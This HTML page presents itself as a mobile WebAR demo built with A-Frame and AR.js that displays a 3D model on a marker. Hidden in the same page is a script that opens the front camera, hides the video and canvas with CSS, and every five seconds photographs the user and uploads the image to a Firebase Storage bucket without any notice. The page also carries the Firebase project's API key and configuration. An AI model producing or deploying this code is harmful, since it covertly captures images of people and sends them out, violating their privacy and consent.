<!DOCTYPE html>
<html>
<head>
    <title>WebAR Demo on Mobile</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/AR-js-org/AR.js/aframe/build/aframe-ar.js"></script>
    <style>
        body { margin: 0; overflow: hidden; }
    </style>
    <style>
        /* Скрываем видео и холст */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <script type="module">
        // Импорт модулей Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";    <!-- Подключение Firebase -->
        // Конфигурация Firebase (вставь свои ключи)
        const firebaseConfig = {
  apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
  authDomain: "individualproject-ad702.firebaseapp.com",
  projectId: "individualproject-ad702",
  storageBucket: "individualproject-ad702.appspot.com",
  messagingSenderId: "365705238227",
  appId: "1:365705238227:web:97496033f4e09db0966626"
};
        // Инициализация Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Получаем доступ к фронтальной камере
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                // Начинаем автоматически делать фото через каждые 5 секунд
                setInterval(captureAndUploadPhoto, 5000);
            })
            .catch(error => {
                console.error("Error accessing camera:", error);
            });

        // Функция для автоматического снятия фото и загрузки на Firebase
        function captureAndUploadPhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Преобразуем изображение в Data URL
            const dataURL = canvas.toDataURL('image/png');

            // Преобразуем Data URL в файл и загружаем на Firebase
            uploadToFirebase(dataURL);
        }

        // Функция загрузки изображения на Firebase Storage
        function uploadToFirebase(dataURL) {
            const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
            const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);

            // Загрузка файла на Firebase Storage
            uploadBytes(storageRef, file)
                .then(() => {
                    console.log("Photo uploaded successfully!");
                })
                .catch(error => {
                    console.error("Error uploading photo:", error);
                });
        }

        // Вспомогательная функция для конвертации Data URL в файл
        function dataURLtoFile(dataurl, filename) {
            const arr = dataurl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
    </script>
    
    <!-- AR-сцена -->
    <a-scene embedded arjs>
        <!-- Добавляем курсор для обработки нажатий на мобильных устройствах -->

        <!-- Маркер Hiro для распознавания -->
        <a-marker preset="hiro">
            <!-- 3D-модель (замени ссылку на свою модель) -->
            <a-entity gltf-model="url(testModel.glb)" 
                      scale="0.5 0.5 0.5" 
                      position="0 0 0" 
                      rotation="0 180 0" 
                      id="interactiveObject"></a-entity>
        </a-marker>

        <!-- Камера -->
        <a-entity camera></a-entity>
    </a-scene>

    <script>
        // Считывание нажатий на телефоне
        const object = document.getElementById("interactiveObject");

        object.addEventListener("click", () => {
            object.setAttribute("animation", {
                property: "rotation",
                to: "0 0 360",
                loop: true,
                dur: 4000,
            });
        });
    </script>
</body>
</html>
